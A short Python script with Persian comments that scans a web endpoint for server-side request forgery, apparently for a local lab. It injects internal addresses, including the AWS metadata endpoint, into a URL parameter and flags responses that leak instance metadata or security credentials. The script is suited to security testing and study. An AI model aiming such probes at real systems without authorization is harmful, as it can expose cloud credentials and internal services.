import requests

def test_ssrf(url, param):
    print(f"[*] Testing SSRF on: {url}")
    
    # آدرس‌های داخلی که هکرها معمولاً تست می‌کنن
    internal_targets = [
        "http://127.0.0.1/",                    # خود سرور
        "http://localhost/",                    # همنام لوکال
        "http://169.254.169.254/latest/meta-data/",  # AWS Metadata
        "http://[::1]/",                        # IPv6 لوکال
        "http://0.0.0.0/"                       # آدرس عمومی لوکال
    ]
    
    for target in internal_targets:
        test_url = f"{url}?{param}={target}"
        try:
            r = requests.get(test_url, timeout=5)
            
            # اگه سرور جواب داد و خطایی نداد، یعنی تونسته به اون آدرس داخلی دسترسی پیدا کنه
            if r.status_code == 200 and "Error:" not in r.text[:20]:
                print(f"\n[+] POTENTIAL SSRF FOUND!")
                print(f"    Target: {target}")
                print(f"    Response Snippet: {r.text[:150]}")
                
                # چک کردن نشانه‌های خاص
                if "latest" in target and "meta-data" in target:
                    if "ami-" in r.text or "security-credentials" in r.text:
                        print(f"    [!!!] AWS METADATA LEAKED! CRITICAL!")
                        
        except Exception:
            pass
    
    print("\n[*] SSRF Scan complete.")

if __name__ == "__main__":
    target_url = "http://127.0.0.1:8000/fetch"
    scan_ssrf_target = "http://127.0.0.1:8000"
    test_ssrf(target_url, "url")
